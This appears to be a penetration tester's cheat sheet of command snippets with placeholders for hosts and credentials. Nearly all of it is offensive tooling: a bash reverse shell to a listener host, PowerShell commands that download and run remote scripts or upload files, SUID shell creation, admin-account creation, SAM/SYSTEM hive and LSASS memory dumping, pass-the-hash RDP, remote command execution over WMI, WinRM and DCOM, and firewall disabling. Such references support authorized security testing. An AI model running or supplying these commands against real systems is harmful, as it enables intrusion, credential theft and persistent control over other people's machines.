;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

% pentest

$ lhost: ip -j address | jq -r '.[].addr_info.[]|select(.label)|[.label,.local]|@tsv' --- --delimiter '\t' --column 2 --prevent-extra
$ rhost: getent hosts | awk '{printf "%s\t%s\n",$2,$1}' --- --delimiter '\t' --column 2 --prevent-extra
$ dict: find ~/Documents/SecLists -type f --- --prevent-extra

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

# bash reverse shell
bash -i >& /dev/tcp/<lhost>/<lport> 0>&1

# ssh socks
ssh -D <lport> <username>@<rhost>

# ssh reverse socks
ssh -R <lport> <username>@<lhost>

# chisel reverse server
chisel server -p <lport> --reverse

# chisel reverse client
chisel client <lhost>:<lport> R:<lport2>:socks

# nmap ipv6
nmap -6 <rhost>

# dig zone transfer
dig axfr @<rhost> <domain>

# ldapsearch base
ldapsearch -x -H ldap://<rhost> -s base

# ldapsearch auth
ldapsearch -x -H ldap://<rhost> -D <username>@<domain> -w <password> -b 'dc=<dc0>,dc=<dc1>'

# smbclient list
smbclient -U <username> -L <rhost>

# smbclient access
smbclient -U <username> '\\''<rhost>''\''<share>'

# rpcclient
rpcclient -U <username> <rhost>

# snmpwalk
snmpwalk -v 2c -c public <rhost> .1 ET-SNMP-EXTEND-MIB::nsExtendOutputFull

# xfreerdp password auth
xfreerdp /cert-ignore /u:<username> /p:<password> /v:<rhost> /d:<domain>

# xfreerdp ntlm auth
xfreerdp /cert-ignore /u:<username> /pth:<ntlm> /v:<rhost> /d:<domain>

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

# bash privileged shell
cp /bin/sh /tmp/sh && chmod +s /tmp/sh

# docker check permission
ip link add dummy0 type dummy && ip link delete dummy0

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

# iwr download and run script
IEX(IWR 'http://<lhost>:<lport>/<path>' -UseBasicParsing)

# new-object download and run script
IEX(New-Object Net.WebClient).DownloadString('http://<lhost>:<lport>/<path>')


$cred.GetNetworkCredential().Password
$cred = Import-CliXml -Path PATH
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USERNAME', (ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force))
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes('PATH'))
Get-ACL PATH | fl *
Set-Acl -Path DST -AclObject $(Get-Acl -Path SRC)
Get-ChildItem -Path PATH -Include PATTERN -File -Recurse -Force -ErrorAction SilentlyContinue
Get-Command COMMAND
Set-Location HKLM:\\System\CurrentControlSet\Services; Get-ChildItem
Invoke-Command -ScriptBlock {whoami} -Credential $cred -Computer localhost
Start-Process -FilePath "powershell" -ArgumentList COMMAND -Credential $cred
(New-Object Net.WebClient).DownloadFile('http://IP:PORT/FILE', 'FILE')
(New-Object Net.WebClient).UploadFile('http://IP:PORT/FILE', 'FILE')
Enter-PSSession -ComputerName COMPUTER -Credential $cred
Get-CimInstance -ClassName win32_service
Get-ScheduledTask
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
([ADSI]'').distinguishedName
$direntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DN", USERNAME, PASSWORD)
(New-Object System.DirectoryServices.DirectorySearcher($direntry)).FindAll()
iwr -UseDefaultCredentials http://IP
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "IP")).Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c COMMAND", "7")
powershell -ep bypass
(Get-PSReadlineOption).HistorySavePath
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

# net create new user
net user USERNAME PASSWORD /add

# net add user to Administrator group
net localgroup Administrators <username> /add

wmic /node:IP /user:USERNAME /password:PASSWORD process call create "COMMAND"
winrs -r:IP -u:USERNAME -p:PASSWORD "COMMAND"

cacls FILE /t /e /p USERNAME:F
cmdkey /list
dir /s/b FILE
net localgroup Administrators
net group /domain
net use D: \\IP\C$ PASSWORD /user:USERNAME
powershell -EncodedCommand COMMAND
reg save HKLM\SAM PATH
reg save HKLM\SYSTEM PATH
runas /user:DOMAIN\USERNAME /savecred PATH
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump PID PATH full
sc config SERVICE bin_path= "PATH"
sc qc SERVICE
systeminfo
tasklist /svc
type PATH | powershell -NoProfile -
where COMMAND
whoami /all
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
icacls PATH
schtasks /query /fo LIST /v | findstr /r /c:"^TaskName" /c:"^Task To Run" /c:"^Run As User" /c:"^Author"
netsh firewall set opmode mode=disable
netsh interface portproxy add v4tov4 listenport=PORT listenaddress=IP connectport=PORT connectaddress=IP
netsh advfirewall firewall add rule name="RULE" protocol=TCP dir=in localip=IP localport=PORT action=allow
setspn -L SERVICE
klist
vshadow -nw -p C:
shutdown /r /t 0
